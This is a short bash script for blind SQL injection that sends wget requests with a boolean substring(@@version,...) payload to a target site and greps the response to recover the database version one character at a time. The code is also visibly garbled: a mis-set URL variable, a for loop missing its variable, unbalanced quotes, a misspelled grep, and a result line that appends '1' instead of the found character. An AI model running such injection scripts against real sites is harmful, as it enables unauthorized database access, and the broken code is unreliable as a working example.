#!/bin/bash

charset=`echo {0..9} {A..z} \. \; \: \, \_ \@`

export URL= "http://blinsql.site/index.php"
export truestring="We worked with them in past."
export maxlength=$1

export result=""

for ((j=1;j<$maxlength;j+=1))
do
    export nthchar=$j
    for in $charset
    do
        wget "$url?index=theoff" and substring(@@version,$nthchar,1)='$i" -q -O - | grept "$truestring"
        if[ "$?" == "0"]
        then
            echo Character number $nthchar found: $1
            export result+=1
            break
        fi
    done
done

echo Result: $result
